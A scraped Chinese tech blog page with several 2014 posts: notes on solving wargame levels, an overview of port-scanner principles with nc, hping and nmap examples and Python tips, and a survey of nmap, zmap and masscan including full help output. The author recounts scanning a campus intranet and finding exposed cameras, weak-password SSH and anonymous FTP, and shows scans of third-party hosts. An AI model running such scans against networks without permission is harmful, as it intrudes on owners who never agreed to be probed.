<p>第二关，习惯性打开js文件，赫然写着<code>password</code>几个大字。然后就是在浏览器调试工具或者node中跑呗。出题人耍了个小技巧，让结果不返回。反正我当时竟然凭着对js的一点浅薄知识一路复制粘帖用js一层一层解了三次。最后碰到一堆<code>[+&gt;]</code>的东西。我竟然以为是brainfuck，然后把自己电脑跑死机了……后来才忽然感觉是js，复制运行得到结果。</p>
<p>第三关，一不小心在论坛上看到结果了，不过这显然对我不是什么问题。</p>
<p>第四关，发了好久呆。不了解jpg文件格式，用vim打开也没看出什么。后来发现vim打开二进制文件必须加<code>-b</code>参数。再后来在论坛上其他人的提醒下发现竟然是两幅图。光看文件大小真看不出来。</p>
<p>第五关，最简单有没有。虽然不知道都是些什么，全靠百度得来答案。。。是的，百度，谷歌都没用上。</p>
<p>第六关，试了<code>~</code>后缀，最后论坛上有人提醒是vi……真是丧心病狂……</p>
<p>第七关，还是仰仗论坛上提醒要大小写，又这么一碰竟然过了。然后128位的哈希一看就是md5,直接google得到结果。</p>
<p>第八关，代码审计给跪了，php完全不会。考虑暴力穷举感觉尝试量太大，后来见论坛上有人穷举出来了……于是也随手写了个小程序穷举起来。最后论坛上其它人用我的程序穷举出来了我还没穷举出来……</p>
<p>第九关，对着习科上答案来的……可能网络太差吧，等了好久。</p>
<p>第十关，对着参考答案来，可每次文件名都变化。看到32字节长的文件名，就想是不是报头中某个变化的东西比如时间的md5？结果愣是没看出来cookie过期了。还抓了上千个哈希试图破解，却发现只有在cmd5可以找到，还是付费内容。写了个小脚本跑字典，也没解出来文件名到底怎么来的。算了，仰仗论坛上大婶的指点，反正过了。</p>
<p>接下来我想写几样东西：</p>
<ul>
<li>关于扫描器的原理与实现</li>
<li>某次抓取DVS/DVR信息的过程</li>
<li>ftp搜索引擎</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/05/04/" itemprop="url">
                  扫描器原理与实现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/05/04/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/05/04//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便写写端口扫描器，估计不会写多。最近事情太多。</p>
<h2 id="原理">原理</h2><p>TCP端口扫描的基本原理，就是尝试与被探测端口建立连接，如果这个连接能够建立上，则说明端口是开放的。另一方面，按照TCP三次握手标准其实探测端口是否开放并不用完成三次握手建立连接，仅仅收到第二次握手的包基本就足以说明该端口确实打开并提供服务。</p>
<p>UDP是另一种无连接不可靠数据报交付协议，仅仅发送UDP报文到指定端口，然后等待返回。如果收到回复信息则说明该端口确实提供UDP服务，如果在有限时间内没收到任何回复就当作该端口不存在吧。</p>
<p>在扫描大量机器的大量端口时，比如对TCP端口扫描，如果我们发送一个包后等待建立连接，可能由于网络原因等待很久才会收到回复的报文。这样其它待扫描端口不得不等着，整个扫描器在这段时间内除了等待什么都不做。网络上行带宽没得到充分利用。所以，一般采用多线程或者异步的方式来实现扫描器的并发。</p>
<p>扫描器往往不仅仅就看看端口是否开放，它们往往还搜集信息供人判断，甚至可以提供payload来与目标进行交互。</p>
<h2 id="检阅">检阅</h2><p>最简单的扫描器，比如说netcat：</p>
<pre><code> ~ ⮀ nc -v -z bbs.byr.cn <span class="number">80</span>
Warning: inverse host lookup failed <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>: 
bbs.byr.cn [<span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>] <span class="number">80</span> (http) open
</code></pre><p>事实上你只要找个能建立连接或者构造包的东西都能作为扫描器，比如hping</p>
<pre><code> ~ ⮀ sudo hping -c <span class="number">1</span> google.com -S -V -p <span class="number">80</span> 
<span class="keyword">using</span> eth0, addr: <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>, MTU: <span class="number">1500</span>
HPING google.com (eth0 <span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span>): S <span class="built_in">set</span>, <span class="number">40</span> headers + <span class="number">0</span> data bytes
len=<span class="number">46</span> ip=<span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span> ttl=<span class="number">29</span> id=<span class="number">13203</span> tos=<span class="number">0</span> iplen=<span class="number">44</span>
sport=<span class="number">80</span> flags=SA seq=<span class="number">0</span> win=<span class="number">42900</span> rtt=<span class="number">185.2</span> ms
seq=<span class="number">2055062331</span> ack=<span class="number">2123742633</span> sum=<span class="number">2338</span> urp=<span class="number">0</span>


--- google.com hping statistic ---
<span class="number">1</span> packets tramitted, <span class="number">1</span> packets received, <span class="number">0</span>% packet loss
</code></pre><p>更专业一点的扫描器有nmap，非常专业的扫描器，在nmap script engine的扩展(lua)下更是可以方便的实现各种功能。功能强大、使用简洁暴力。</p>
<pre><code>✘ ⮀ ~ ⮀ sudo nmap -sS baidu<span class="class">.com</span>

Starting Nmap <span class="number">6.25</span> ( http:<span class="comment">//nmap.org ) at 2014-05-10 10:10 CST</span>
Nmap scan report <span class="keyword">for</span> baidu<span class="class">.com</span> (<span class="number">220.181</span>.<span class="number">111.86</span>)
Host is up (<span class="number">0.0019s</span> latency).
Other addresses <span class="keyword">for</span> baidu<span class="class">.com</span> (not scanned): <span class="number">123.125</span>.<span class="number">114.144</span> <span class="number">220.181</span>.<span class="number">111.85</span>
Not shown: <span class="number">999</span> filtered ports
PORT   STATE SERVICE
<span class="number">80</span>/tcp open  http

Nmap done: <span class="number">1</span> IP <span class="tag">address</span> (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">37.67</span> seconds
</code></pre><p>近两年出现了更加高效的面向整个互联网的扫描器。一个叫zmap，紧接着是masscan。和nmap的多线程实现不同，这两种扫描器靠异步实现高并发。</p>
<h2 id="实践">实践</h2><p>我本来想详细写写最近研究扫描器的一些心得，可是，最近事情太多，没有心情也没有时间。大致用python写扫描器的一些心得吧。</p>
<ol>
<li>你不一定要用别人现成的库。因为你可能根本搞不清有些东西是怎么运作的，而一些细节会让你痛不欲生。事实上如果你只想抓取部分信息，不妨直接自己解析报文对应字段。有时你不得不自己去做什么，比如面对某些用ActiveX的奇葩系统而你还想用python来扫描并搜集信息时。</li>
<li>gevent面对网络I/O真是毫无压力，但同时给内存和CPU带来了更大的负担。据说一个Greenlet占用四个文件描述符，gevent要拷贝大量上下文等等。实际上我这里有时并发根本上不去。超过2000就看着CPU一直处于100%左右而网络流量没有任何变化。不知道是哪里的限制，网络上行无法到达顶峰。但一些简单的例子可以无压力达到。</li>
<li>在进行大范围扫描时不要将某个可能会变的巨大变量塞进内存，虽然把对象放入内存也许会运行的更快，但你的内存满掉时它就不会更快了。这时通过shelve来实现字典相比直接把巨大的dict读入内存并不断扩展更合适。在我的某个例子中，把变量放到硬盘上而不是一股脑塞进内存后性能得到极大改善。</li>
<li><p>大文件的读写时，python有个优雅的方式。一行一行读取。无论是什么巨大的东西，比如说15G的字典文件，这样一行一行读入内存然后让python的垃圾回收机制慢慢回收基本不会占用什么内存。</p>
<pre><code>with <span class="function"><span class="title">open</span><span class="params">(<span class="string">"./data/netbios/temp"</span>)</span></span> as f:
    <span class="keyword">for</span> line <span class="keyword">in</span> f:
        pool.<span class="function"><span class="title">spawn</span><span class="params">(get_netbios, line.strip()</span></span>)
</code></pre></li>
</ol>
<p>还有些其它想法。</p>
<ol>
<li><p>一个是twisted，虽然之前把一个非常棒的教程完整实践下来，寒假拿着手机把文档直接都看完了，甚至Gsoc的时候还想着如果twisted是mentor organization争取报名参加下。结果几个月没接触，完全不知道怎么使用这个框架了。</p>
</li>
<li><p>一个是python对select和epoll的支持，我觉得可能直接使用epoll实现一些并发比gevent会好很多。可是没空去试，我一直觉得epoll和select这种东西用python写出来真是不堪入目。如果是py3，async也许是个好主意。</p>
</li>
<li><p>在使用python做一些比如ip地址处理等等的时候，你也许会发现python3有着内置的模块，更优雅的处理方式。有那么几次真想完全用python3改写已经使用的东西。不过，还是没空。</p>
</li>
</ol>
<p>还有，同学给了我片单片机，我忽然觉得扫描器玩腻了……</p>
<p>不过面对积累的大量扫描数据，我觉得做做数据分析和可视化还是不错的。不会遥遥无期吧，尽管只对python的工具稍微熟悉，更想去用d3.js做展示。</p>
<p>时间和精力有限，语言技能点该怎么点呢？</p>
<p>汇编、C、javascript、python3、lua、也许go、也许再个ruby.</p>
<p>还有两本书等着看或正在看，TCP/IP internetworking和深入理解计算机系统.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/04/18/" itemprop="url">
                  且谈扫描器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-04-18T00:00:00+08:00" content="2014-04-18">
              2014-04-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/04/18/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/04/18//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="缘起">缘起</h2><p>大概是因为论坛一个毕业去阿里的师兄就这么扫到了一个某品牌摄像头web管理界面。接着，对于我，YD的几周便开始了。各种扫描内网啊，No zuo no die啊= =，然后找到了一大堆开放到内网的摄像头、弱口令ssh、匿名ftp、嵌入式板甚至还有ip电话……独留我风中凌乱。</p>
<p>我准备把常见的东西都研究一圈= =</p>
<p>总之，用到了几种扫描器和自己写的扫描器……</p>
<h2 id="nmap">nmap</h2><p>nmap是一个专业的网络探索和安全审计开源工具。尽管它可以针对主机，却被设计来快速扫描大规模网络。nmap使用IP报文来决定网络上的主机是否可达，主机上哪些服务开放(应用程序名和版本)，它们运行着什么样的操作系统，包过滤器和防火墙的情况和许多其它特征。尽管nmap广泛用于安全审计。许多系统和网络管理员在实行日常工作比如网络发现、管理服务升级安排，监控主机或服务启动时间<br>时都很好用。</p>
<p>nmap的输出是一列被扫描的目标，和有关参数指定的补充信息。常见的比如说端口信息表：</p>
<p> ~ ⮀ sudo nmap 10.210.96.193</p>
<pre><code>Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 21:44 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.054</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE
<span class="number">21</span>/tcp    ssh      closed
<span class="number">23</span>/tcp    open     telnet
<span class="number">50389</span>/tcp filtered unknown
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><ul>
<li><code>open</code>意味着服务在启动并监听着。比如TCP的三次握手成功建立。</li>
<li><code>closed</code>表示该端口上服务关闭。比如收到了目标主机返回的RST.</li>
<li><code>filtered</code>意味着有防火墙，过滤器等其它障碍阻塞了端口，以致于nmap不知道端口是<code>open</code>还是<code>closed</code>。出现这种情况是发出去的探测包没了响应。</li>
</ul>
<p>如果nmap不能确定到底是哪个状态，这些状态可以写成折中形式<code>closed|filtered</code>,表示关闭或者是过滤。</p>
<p>当使用版本探测参数(<code>-sV</code>)时，端口信息表也可以包含具体的服务版本信息。</p>
<pre><code> ~ ⮀ sudo nmap -sV <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:03 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.045</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE VERSION
<span class="number">23</span>/tcp    open     telnet  H3C <span class="keyword">switch</span> telnetd
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
Service <span class="string">Info:</span> <span class="string">Device:</span> <span class="keyword">switch</span>

Service detection performed. Please report any incorrect results at <span class="string">http:</span><span class="comment">//nmap.org/submit/ .</span>
Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.88</span> seconds
</code></pre><p>当使用IP协议扫描(<code>-sO</code>)时，nmap则提供IP支持的协议而不是端口：</p>
<pre><code> ~ ⮀ sudo nmap -sO <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:02 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.010</span>s latency).
Not <span class="string">shown:</span> <span class="number">252</span> open|filtered protocols
PROTOCOL STATE  SERVICE
<span class="number">1</span>        open   icmp
<span class="number">6</span>        open   tcp
<span class="number">17</span>       open   udp
<span class="number">132</span>      closed sctp
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><p>除了端口信息表，nmap提供目标的更多信息，包括反向DNS域名，操作系统猜测，设备类型和MAC地址。</p>
<p>更多参照<a href="http://nmap.org/book/" target="_blank" rel="external">Nmap Guide</a></p>
<pre><code><span class="bullet"> ~ </span>⮀ nmap --help
Nmap 6.25 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -<span class="ruby">iL &lt;inputfilename&gt;<span class="symbol">:</span> <span class="constant">Input</span> from list of hosts/networks
</span>  -<span class="ruby">iR &lt;num hosts&gt;<span class="symbol">:</span> <span class="constant">Choose</span> random targets
</span>  -<span class="ruby">-exclude &lt;host1[,host2][,host3],...&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> hosts/networks
</span>  -<span class="ruby">-excludefile &lt;exclude_file&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> list from file
</span>HOST DISCOVERY:
  -<span class="ruby"><span class="symbol">sL:</span> <span class="constant">List</span> <span class="constant">Scan</span> - simply list targets to scan
</span>  -<span class="ruby"><span class="symbol">sn:</span> <span class="constant">Ping</span> <span class="constant">Scan</span> - disable port scan
</span>  -<span class="ruby"><span class="constant">Pn</span><span class="symbol">:</span> <span class="constant">Treat</span> all hosts as online -- skip host discovery
</span>  -<span class="ruby"><span class="constant">PS</span>/<span class="constant">PA</span>/<span class="constant">PU</span>/<span class="constant">PY</span>[portlist]<span class="symbol">:</span> <span class="constant">TCP</span> <span class="constant">SYN</span>/<span class="constant">ACK</span>, <span class="constant">UDP</span> <span class="keyword">or</span> <span class="constant">SCTP</span> discovery to given ports
</span>  -<span class="ruby"><span class="constant">PE</span>/<span class="constant">PP</span>/<span class="constant">PM</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo, timestamp, <span class="keyword">and</span> netmask request discovery probes
</span>  -<span class="ruby"><span class="constant">PO</span>[protocol list]<span class="symbol">:</span> <span class="constant">IP</span> <span class="constant">Protocol</span> <span class="constant">Ping</span>
</span>  -<span class="ruby">n/-<span class="constant">R</span><span class="symbol">:</span> <span class="constant">Never</span> <span class="keyword">do</span> <span class="constant">DNS</span> resolution/<span class="constant">Always</span> resolve [<span class="symbol">default:</span> sometimes]
</span>  -<span class="ruby">-dns-servers &lt;serv1[,serv2],...&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">DNS</span> servers
</span>  -<span class="ruby">-system-<span class="symbol">dns:</span> <span class="constant">Use</span> <span class="constant">OS</span><span class="string">'s DNS resolver
</span></span>  -<span class="ruby"><span class="string">-traceroute: Trace hop path to each host
</span></span>SCAN TECHNIQUES:
  -<span class="ruby"><span class="string">sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span></span>  -<span class="ruby"><span class="string">sU: UDP Scan
</span></span>  -<span class="ruby"><span class="string">sN/sF/sX: TCP Null, FIN, and Xmas scans
</span></span>  -<span class="ruby"><span class="string">-scanflags &lt;flags&gt;: Customize TCP scan flags
</span></span>  -<span class="ruby"><span class="string">sI &lt;zombie host[:probeport]&gt;: Idle scan
</span></span>  -<span class="ruby"><span class="string">sY/sZ: SCTP INIT/COOKIE-ECHO scans
</span></span>  -<span class="ruby"><span class="string">sO: IP protocol scan
</span></span>  -<span class="ruby"><span class="string">b &lt;FTP relay host&gt;: FTP bounce scan
</span></span>PORT SPECIFICATION AND SCAN ORDER:
  -<span class="ruby"><span class="string">p &lt;port ranges&gt;: Only scan specified ports
</span></span>    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -<span class="ruby"><span class="string">F: Fast mode - Scan fewer ports than the default scan
</span></span>  -<span class="ruby"><span class="string">r: Scan ports consecutively - don'</span>t randomize
</span>  -<span class="ruby">-top-ports &lt;number&gt;<span class="symbol">:</span> <span class="constant">Scan</span> &lt;number&gt; most common ports
</span>  -<span class="ruby">-port-ratio &lt;ratio&gt;<span class="symbol">:</span> <span class="constant">Scan</span> ports more common than &lt;ratio&gt;
</span>SERVICE/VERSION DETECTION:
  -<span class="ruby"><span class="symbol">sV:</span> <span class="constant">Probe</span> open ports to determine service/version info
</span>  -<span class="ruby">-version-intensity &lt;level&gt;<span class="symbol">:</span> <span class="constant">Set</span> from <span class="number">0</span> (light) to <span class="number">9</span> (try all probes)
</span>  -<span class="ruby">-version-<span class="symbol">light:</span> <span class="constant">Limit</span> to most likely probes (intensity <span class="number">2</span>)
</span>  -<span class="ruby">-version-<span class="symbol">all:</span> <span class="constant">Try</span> every single probe (intensity <span class="number">9</span>)
</span>  -<span class="ruby">-version-<span class="symbol">trace:</span> <span class="constant">Show</span> detailed version scan activity (<span class="keyword">for</span> debugging)
</span>SCRIPT SCAN:
  -<span class="ruby"><span class="symbol">sC:</span> equivalent to --script=default
</span>  -<span class="ruby">-script=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> &lt;<span class="constant">Lua</span> scripts&gt; is a comma separated list of 
</span>           directories, script-files or script-categories
  -<span class="ruby">-script-args=&lt;n1=v1,[n2=v2,...]&gt;<span class="symbol">:</span> provide arguments to scripts
</span>  -<span class="ruby">-script-args-file=<span class="symbol">filename:</span> provide <span class="constant">NSE</span> script args <span class="keyword">in</span> a file
</span>  -<span class="ruby">-script-<span class="symbol">trace:</span> <span class="constant">Show</span> all data sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-script-<span class="symbol">updatedb:</span> <span class="constant">Update</span> the script database.
</span>  -<span class="ruby">-script-help=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> <span class="constant">Show</span> help about scripts.
</span>           &lt;Lua scripts&gt; is a comma separted list of script-files or
           script-categories.
OS DETECTION:
  -<span class="ruby"><span class="constant">O</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection
</span>  -<span class="ruby">-osscan-<span class="symbol">limit:</span> <span class="constant">Limit</span> <span class="constant">OS</span> detection to promising targets
</span>  -<span class="ruby">-osscan-<span class="symbol">guess:</span> <span class="constant">Guess</span> <span class="constant">OS</span> more aggressively
</span>TIMING AND PERFORMANCE:
  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -<span class="ruby"><span class="constant">T</span>&lt;<span class="number">0</span>-<span class="number">5</span>&gt;<span class="symbol">:</span> <span class="constant">Set</span> timing template (higher is faster)
</span>  -<span class="ruby">-min-hostgroup/max-hostgroup &lt;size&gt;<span class="symbol">:</span> <span class="constant">Parallel</span> host scan group sizes
</span>  -<span class="ruby">-min-parallelism/max-parallelism &lt;numprobes&gt;<span class="symbol">:</span> <span class="constant">Probe</span> parallelization
</span>  -<span class="ruby">-min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Specifies</span>
</span>      probe round trip time.
  -<span class="ruby">-max-retries &lt;tries&gt;<span class="symbol">:</span> <span class="constant">Caps</span> number of port scan probe retransmissions.
</span>  -<span class="ruby">-host-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Give</span> up on target after this long
</span>  -<span class="ruby">-scan-delay/--max-scan-delay &lt;time&gt;<span class="symbol">:</span> <span class="constant">Adjust</span> delay between probes
</span>  -<span class="ruby">-min-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no slower than &lt;number&gt; per second
</span>  -<span class="ruby">-max-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no faster than &lt;number&gt; per second
</span>FIREWALL/IDS EVASION AND SPOOFING:
  -<span class="ruby">f; --mtu &lt;val&gt;<span class="symbol">:</span> fragment packets (optionally w/given <span class="constant">MTU</span>)
</span>  -<span class="ruby"><span class="constant">D</span> &lt;decoy1,decoy2[,<span class="constant">ME</span>],...&gt;<span class="symbol">:</span> <span class="constant">Cloak</span> a scan with decoys
</span>  -<span class="ruby"><span class="constant">S</span> &lt;<span class="constant">IP_Address</span>&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> source address
</span>  -<span class="ruby">e &lt;iface&gt;<span class="symbol">:</span> <span class="constant">Use</span> specified interface
</span>  -<span class="ruby">g/--source-port &lt;portnum&gt;<span class="symbol">:</span> <span class="constant">Use</span> given port number
</span>  -<span class="ruby">-data-length &lt;num&gt;<span class="symbol">:</span> <span class="constant">Append</span> random data to sent packets
</span>  -<span class="ruby">-ip-options &lt;options&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets with specified ip options
</span>  -<span class="ruby">-ttl &lt;val&gt;<span class="symbol">:</span> <span class="constant">Set</span> <span class="constant">IP</span> time-to-live field
</span>  -<span class="ruby">-spoof-mac &lt;mac address/prefix/vendor name&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> your <span class="constant">MAC</span> address
</span>  -<span class="ruby">-<span class="symbol">badsum:</span> <span class="constant">Send</span> packets with a bogus <span class="constant">TCP</span>/<span class="constant">UDP</span>/<span class="constant">SCTP</span> checksum
</span>OUTPUT:
  -<span class="ruby">oN/-oX/-oS/-oG &lt;file&gt;<span class="symbol">:</span> <span class="constant">Output</span> scan <span class="keyword">in</span> normal, <span class="constant">XML</span>, s|&lt;rIpt kIddi3,
</span>     and Grepable format, respectively, to the given filename.
  -<span class="ruby">oA &lt;basename&gt;<span class="symbol">:</span> <span class="constant">Output</span> <span class="keyword">in</span> the three major formats at once
</span>  -<span class="ruby"><span class="symbol">v:</span> <span class="constant">Increase</span> verbosity level (use -vv <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby"><span class="symbol">d:</span> <span class="constant">Increase</span> debugging level (use -dd <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby">-<span class="symbol">reason:</span> <span class="constant">Display</span> the reason a port is <span class="keyword">in</span> a particular state
</span>  -<span class="ruby">-<span class="symbol">open:</span> <span class="constant">Only</span> show open (<span class="keyword">or</span> possibly open) ports
</span>  -<span class="ruby">-packet-<span class="symbol">trace:</span> <span class="constant">Show</span> all packets sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-<span class="symbol">iflist:</span> <span class="constant">Print</span> host interfaces <span class="keyword">and</span> routes (<span class="keyword">for</span> debugging)
</span>  -<span class="ruby">-log-<span class="symbol">errors:</span> <span class="constant">Log</span> errors/warnings to the normal-format output file
</span>  -<span class="ruby">-append-<span class="symbol">output:</span> <span class="constant">Append</span> to rather than clobber specified output files
</span>  -<span class="ruby">-resume &lt;filename&gt;<span class="symbol">:</span> <span class="constant">Resume</span> an aborted scan
</span>  -<span class="ruby">-stylesheet &lt;path/<span class="constant">URL</span>&gt;<span class="symbol">:</span> <span class="constant">XSL</span> stylesheet to transform <span class="constant">XML</span> output to <span class="constant">HTML</span>
</span>  -<span class="ruby">-<span class="symbol">webxml:</span> <span class="constant">Reference</span> stylesheet from <span class="constant">Nmap</span>.<span class="constant">Org</span> <span class="keyword">for</span> more portable <span class="constant">XML</span>
</span>  -<span class="ruby">-no-<span class="symbol">stylesheet:</span> <span class="constant">Prevent</span> associating of <span class="constant">XSL</span> stylesheet w/<span class="constant">XML</span> output
</span>MISC:
  -<span class="ruby"><span class="number">6</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">IPv6</span> scanning
</span>  -<span class="ruby"><span class="constant">A</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection, version detection, script scanning, <span class="keyword">and</span> traceroute
</span>  -<span class="ruby">-datadir &lt;dirname&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">Nmap</span> data file location
</span>  -<span class="ruby">-send-eth/--send-<span class="symbol">ip:</span> <span class="constant">Send</span> using raw ethernet frames <span class="keyword">or</span> <span class="constant">IP</span> packets
</span>  -<span class="ruby">-<span class="symbol">privileged:</span> <span class="constant">Assume</span> that the user is fully privileged
</span>  -<span class="ruby">-<span class="symbol">unprivileged:</span> <span class="constant">Assume</span> the user lacks raw socket privileges
</span>  -<span class="ruby"><span class="constant">V</span><span class="symbol">:</span> <span class="constant">Print</span> version number
</span>  -<span class="ruby"><span class="symbol">h:</span> <span class="constant">Print</span> this help summary page.
</span>EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</code></pre><h2 id="zmap">zmap</h2><p>Zmap是一个开源网络扫描器，旨在帮助研究人员轻松扫描互联网。通过单个机器和可观的上行量，zmap可以在45分钟内扫描整个IPv4地址段，达到以太网的理论上限。</p>
<p>zmap可以研究随时间变化协议的采用情况。检测互联网上可用的服务，让我们更好的理解分布在互联网上的大系统。</p>
<p>详细用法见：<a href="https://zmap.io/documentation.html" target="_blank" rel="external">Zmap Documentation</a></p>
<p>Zmap是强有力的工具，但请尊重他人和当地法律。</p>
<h2 id="masscan">masscan</h2><p>号称最快的互联网端口扫描器，它能够在6分钟内扫遍整个互联网，每秒发送十个百万数据包。</p>
<p>它生成类似<code>nmap</code>的结果，但内部机理是类似<code>scanrand</code>、<code>unicornscan</code>和<code>zmap</code>异步传输。主要的区别是比它们都快(笑)。另外，它更灵活，允许任意的地址段和端口段。</p>
<p>自由软件。</p>
<pre><code>~/ ⮀ masscan <span class="comment">--help</span>
MASSCAN is a fast port scanner. The primary input parameters are the
IP addresses/ranges you want to scan, and the port numbers. An example
is the following, which scans the 10.x.x.x network for web servers:
 masscan 10.0.0.0/8 -p80
The program auto-detects network interface/adapter settings. If this
fails, you'll have to <span class="operator"><span class="keyword">set</span> these manually. The <span class="keyword">following</span> <span class="keyword">is</span> an
example <span class="keyword">of</span> all the <span class="keyword">parameters</span> that <span class="keyword">are</span> needed:
 <span class="comment">--adapter-ip 192.168.10.123</span>
 <span class="comment">--adapter-mac 00-11-22-33-44-55</span>
 <span class="comment">--router-mac 66-55-44-33-22-11</span>
<span class="keyword">Parameters</span> can be <span class="keyword">set</span> either via the command-line <span class="keyword">or</span> config-<span class="keyword">file</span>. The
<span class="keyword">names</span> <span class="keyword">are</span> the same <span class="keyword">for</span> <span class="keyword">both</span>. Thus, the above adapter <span class="keyword">settings</span> would
appear <span class="keyword">as</span> <span class="keyword">follows</span> <span class="keyword">in</span> a configuration <span class="keyword">file</span>:
 adapter-ip = <span class="number">192.168</span><span class="number">.10</span><span class="number">.123</span>
 adapter-mac = <span class="number">00</span>-<span class="number">11</span>-<span class="number">22</span>-<span class="number">33</span>-<span class="number">44</span>-<span class="number">55</span>
 router-mac = <span class="number">66</span>-<span class="number">55</span>-<span class="number">44</span>-<span class="number">33</span>-<span class="number">22</span>-<span class="number">11</span>
